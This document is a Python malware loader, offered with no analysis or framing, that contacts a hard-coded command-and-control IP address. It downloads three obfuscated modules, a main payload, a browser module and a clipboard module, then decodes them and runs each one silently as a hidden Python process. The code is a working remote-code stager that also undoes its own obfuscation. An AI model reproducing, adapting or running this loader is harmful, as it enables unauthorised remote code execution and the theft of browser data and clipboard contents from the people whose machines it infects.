import base64
import zlib
import os
import platform
import subprocess
import requests


def obfuscate(script):
    encoded = script.encode('utf-8')
    compressed = zlib.compress(encoded)
    b64_encoded = base64.b64encode(compressed)
    reversed_b64 = b64_encoded[::-1]
    return reversed_b64.decode('utf-8')


def deobfuscate(encoded_script):
    reversed_b64 = encoded_script[::-1]
    compressed = base64.b64decode(reversed_b64)
    decoded = zlib.decompress(compressed)
    return decoded.decode('utf-8')


def download_payload(endpoint):
    url_c2 = f"http://5.253.43.122:1224/{endpoint}"
    try:
        response = requests.get(url_c2, timeout=10)
        if response.status_code == 200:
            return response.text
    except requests.RequestException:
        pass
    return ""

def execute_payload(obfuscated_payload, filename):
    payload = deobfuscate(obfuscated_payload)
    with open(filename, "w") as f:
        f.write(payload)
    subprocess.Popen(["python", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def detect_os():
    return platform.system()

def main():
    os_type = detect_os()
    print(f"[+] Detected OS: {os_type}")
    obfuscated_payload = download_payload("payload")
    if obfuscated_payload:
        print(f"[+] Downloaded obfuscated payload: {obfuscated_payload[:50]}...")
        execute_payload(obfuscated_payload, "payload.py")

    obfuscated_brow = download_payload("brow")
    if obfuscated_brow:
        print(f"[+] Downloaded obfuscated browser module.")
        execute_payload(obfuscated_brow, "brow.py")

    obfuscated_mclip = download_payload("mclip")
    if obfuscated_mclip:
        print(f"[+] Downloaded obfuscated clipboard module.")
        execute_payload(obfuscated_mclip, "mclip.py")


if __name__ == "__main__":
    main()
## Payload99_31, Payload99_71, Payload99_7